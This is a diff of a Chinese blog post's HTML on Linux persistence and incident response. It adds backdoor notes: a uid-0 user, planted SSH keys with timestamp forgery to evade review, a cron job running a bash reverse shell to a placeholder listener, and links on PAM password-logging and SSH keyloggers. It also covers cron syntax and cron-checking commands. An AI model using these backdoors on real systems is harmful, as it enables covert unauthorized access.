@@ -9,7 +9,7 @@
   <title>Linux权限维持&amp;应急 | Ak4izZ&#39;s 滴博客儿</title>
   <meta name="author" content="Ak4izZ">
   
-  <meta name="description" content="面试被问到了之后又学了一遍，没想到半夜就遇到服务器报警了（纯给自己挖坑），记录一下。"> 
+  <meta name="description" content="半夜遇到服务器报警了（纯给自己挖坑），记录一下。"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -131,8 +131,11 @@
 	<div class="mypage">		
 	  		
 
-	  <p>面试被问到了之后又学了一遍，没想到半夜就遇到服务器报警了（纯给自己挖坑），记录一下。</p>
+	  <p>半夜遇到服务器报警了（纯给自己挖坑），记录一下。</p>
 <span id="more"></span>
+
+<p>面试被问到了之后又学了一遍，没想到半夜就遇到服务器报警了（纯给自己挖坑），记录一下。</p>
+<!--more-->
 
 <h1 id="Linux权限维持——后门"><a href="#Linux权限维持——后门" class="headerlink" title="Linux权限维持——后门"></a>Linux权限维持——后门</h1><p>常见的后门有cron后门、ssh后门、vim后门、超级用户、alias后门等</p>
 <h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>创建uid为0的用户，加入root初始登陆组和附加组，并设置home目录，这里可以把目录放在不容易找得到的地方。</p>
@@ -142,24 +145,63 @@
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> <span class="token parameter variable">-p</span> <span class="token variable"><span class="token variable">`</span>openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> <span class="token string">'mysalt'</span> mypassword<span class="token variable">`</span></span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><code>-1</code> 选项用于指定md5加密，除此之外还有<code>-5</code> 表示sha256，<code>-6</code> 表示sha512，<code>-apr1</code> 表示apache的MD5算法。</p>
-<h2 id="利用ssh公私钥免密登录"><a href="#利用ssh公私钥免密登录" class="headerlink" title="利用ssh公私钥免密登录"></a>利用ssh公私钥免密登录</h2><p>在自己的机器上生成公私钥，然后公钥放到服务器上（~.&#x2F;ssh&#x2F;authorized_keys），保留私钥，就可以用ssh登录了</p>
+<h2 id="SSH的利用"><a href="#SSH的利用" class="headerlink" title="SSH的利用"></a>SSH的利用</h2><h3 id="直接公私钥利用"><a href="#直接公私钥利用" class="headerlink" title="直接公私钥利用"></a>直接公私钥利用</h3><p>在自己的机器上生成公私钥，然后公钥放到服务器上（~.&#x2F;ssh&#x2F;authorized_keys），保留私钥，就可以用ssh登录了</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>其中 <code>id_rsa</code>是私钥<code>id_rsa.pub</code> 是公钥。公钥追加到<code>~./ssh/authorized_keys</code>中。防止排查，还可以touch改一下文件的修改日期，见后文。</p>
+<p>其中 <code>id_rsa</code>是私钥<code>id_rsa.pub</code> 是公钥。公钥追加到<code>~./ssh/authorized_keys</code>中。防止排查，还可以touch改一下文件的修改日期<code>touch -r ~./ssh/id_ras ~./ssh/authorized_keys</code>。</p>
+<h3 id="SSH-Wrapper"><a href="#SSH-Wrapper" class="headerlink" title="SSH Wrapper"></a>SSH Wrapper</h3><h3 id="SSH-软连接"><a href="#SSH-软连接" class="headerlink" title="SSH 软连接"></a>SSH 软连接</h3><p>这块在提权方面也有一些路径，也放在坑里。<br>这块用到了PAM认证的机制，但几篇博客看下来操作的方法都不太一样。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/pingan233/article/details/129168638">https://blog.csdn.net/pingan233/article/details/129168638</a></p>
+<h3 id="PAM密码记录后门"><a href="#PAM密码记录后门" class="headerlink" title="PAM密码记录后门"></a>PAM密码记录后门</h3><p><a target="_blank" rel="noopener" href="https://www.v4ler1an.com/2020/12/backdoor/#6-linux-pam%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0">https://www.v4ler1an.com/2020/12/backdoor/#6-linux-pam%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8618">https://xz.aliyun.com/t/8618</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2129693">PAM系统模块说明</a></p>
+<h3 id="SSH-Keylogger"><a href="#SSH-Keylogger" class="headerlink" title="SSH Keylogger"></a>SSH Keylogger</h3><p>利用strace系统调试工具跟踪ssh的系统调用，生成一个包含ssh命令执行期间的系统调用信息日志文件</p>
+<h3 id="strace监听ssh来源流量（alias欺骗）"><a href="#strace监听ssh来源流量（alias欺骗）" class="headerlink" title="strace监听ssh来源流量（alias欺骗）"></a>strace监听ssh来源流量（alias欺骗）</h3><p><strong>strace命令</strong> 是一个集诊断、调试、统计与一体的工具，我们可以使用strace对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。strace的最简单的用法就是执行一个指定的命令，在指定的命令结束之后它也就退出了。在命令执行的过程中，strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。（<a target="_blank" rel="noopener" href="https://wangchujiang.com/linux-command/c/strace.html%EF%BC%89">https://wangchujiang.com/linux-command/c/strace.html）</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7698">linux后渗透之收集登录凭证</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34923966/article/details/113917207">键盘记录、凭证抓取</a></p>
 <h2 id="SUID-Shell"><a href="#SUID-Shell" class="headerlink" title="SUID Shell"></a>SUID Shell</h2><p>SUID（set user id）是一种特殊权限机制，允许一个可执行文件在执行时短暂获得所有者的权限，而不是执行者的权限。即若一个文件被标记了SUID，他的属主是root，那么普通用户便可以以root的身份运行这个可执行文件。</p>
 <img src="/2023/10/23/Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%BA%94%E6%80%A5/image-20231023213654136.png" class title="image-20231023213654136">
 
-<p>这是一种提权方式吧，关于更多的SUID利用方法，可以在 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/#+suid">GTFOBins</a>找到。</p>
+<p>这也是一种提权方式，关于更多的SUID利用方法，可以在 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/#+suid">GTFOBins</a>找到。具体更多提权操作方法先挖一个坑。</p>
 <h2 id="计划任务crontab"><a href="#计划任务crontab" class="headerlink" title="计划任务crontab"></a>计划任务crontab</h2><p>若创建新的cron任务，并不会马上执行，一般过2分钟后才能够执行，或者可以重启cron马上执行。</p>
 <p>crontab -l 命令用于查看定时任务，实际等同于<code>cat /var/spool/cron/crontabs/&#123;username&#125;</code>下的文件。</p>
-<p>建立后门脚本 <code>first.sh</code>， </p>
+<p>而<code>/etc/cron.d/</code> 下，可能会存在<code>cron.deny</code>，<code>cron.allow</code>文件，前者用于禁止里面列出的用户访问crontab，而后者则是允许，即黑白名单。</p>
+<p>创建后门脚本 <code>first.sh</code> </p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
 <span class="token function">bash</span> <span class="token parameter variable">-I</span> <span class="token operator">>&amp;</span> /dev/tcp/<span class="token punctuation">&#123;</span>Lhost-ip<span class="token punctuation">&#125;</span>/<span class="token punctuation">&#123;</span>Lhost-port<span class="token punctuation">&#125;</span> <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
+<p>添加执行权限，设置定时任务</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +sx /etc/firsh.sh 
+<span class="token function">crontab</span> <span class="token parameter variable">-e</span>
+<span class="token comment"># 每分钟执行一次</span>
+*/1 * * * * root /etc/evil.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="crontab的时间格式"><a href="#crontab的时间格式" class="headerlink" title="crontab的时间格式"></a>crontab的时间格式</h3><p>这里插播一条小知识（已经忘记是第几次记这个了）</p>
+<p>crontab的时间格式是这么规定的</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>minute<span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>hour<span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>day-of-month<span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>month<span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>day-of-week<span class="token punctuation">&#125;</span> <span class="token punctuation">&#123;</span>full-path-to-shell-script<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>如在每天的 12:01am 执行脚本，就可以写成</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span> <span class="token number">0</span> * * * /dir/to/script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p>简便一点的话，还能这么写。disown是一个shell命令，用于将一个作业从shell的<code>作业表</code>中移除，使其成为后台任务且不受shell的影响。@daily等是时间表达式，其他的还有@weekly，@hourly等</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@daily /dir/to/script.sh disown
+@reboot /dir/to/script.sh disown
+@monthly /dir/to/script.sh disown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
+<p>提到作业表（Job Table）再多记一下</p>
+<p>Shell的作业表是shell程序用来追踪和管理正在运行的作业的结构，记录了当前shell会话中的启动的所有进程和命令。作业表允许 shell 程序跟踪以下信息：</p>
+<ol>
+<li><strong>作业号（Job Number）</strong>：每个作业都会被分配一个唯一的编号，通常是一个整数。</li>
+<li><strong>进程号（Process ID）</strong>：对应于该作业的实际执行进程的唯一标识符。</li>
+<li><strong>作业状态（Job Status）</strong>：记录了作业的状态，如运行中、暂停、终止等。</li>
+<li><strong>命令</strong>：与作业关联的命令或进程的描述。</li>
+</ol>
+<p>作业表允许用户在一个shell会话中进行多个作业，并且能够进行切换和管理、监控等，常见的作业相关的命令有</p>
+<ul>
+<li>jobs：列出当前shell会话中的所有作业</li>
+<li>fg：将一个后台作业移动到前台</li>
+<li>bg：将前台作业移动到后台</li>
+<li>kill：终止一个作业</li>
+<li>disown：将一个作业从作业表中移除，使其不受 shell 关闭的影响。</li>
+</ul>
+<p>唉扯远了。。。</p>
 <h2 id="TCP-Wrappers"><a href="#TCP-Wrappers" class="headerlink" title="TCP Wrappers"></a>TCP Wrappers</h2><h2 id="Openssh后门"><a href="#Openssh后门" class="headerlink" title="Openssh后门"></a>Openssh后门</h2><h1 id="Linux权限维持——隐藏"><a href="#Linux权限维持——隐藏" class="headerlink" title="Linux权限维持——隐藏"></a>Linux权限维持——隐藏</h1><h1 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h1><h2 id="计划任务检查"><a href="#计划任务检查" class="headerlink" title="计划任务检查"></a>计划任务检查</h2><p><strong>读文件的方法获取计划任务</strong> ：</p>
 <ol>
 <li>在&#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录下存放着所有用户的计划任务，可以一个个cat</li>
@@ -174,6 +216,11 @@
 <p><strong>crontab命令读取计划任务</strong>：crontab -l -u {username}</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/passwd <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-f</span> <span class="token number">1</span> <span class="token parameter variable">-d</span> <span class="token builtin class-name">:</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-I</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token function">crontab</span> <span class="token parameter variable">-l</span> <span class="token parameter variable">-u</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93</a></p>
+<p><a target="_blank" rel="noopener" href="https://wangchujiang.com/linux-command/c/strace.html">https://wangchujiang.com/linux-command/c/strace.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7698">https://xz.aliyun.com/t/7698</a></p>
 
 	  <div class="article-footer-copyright">
 
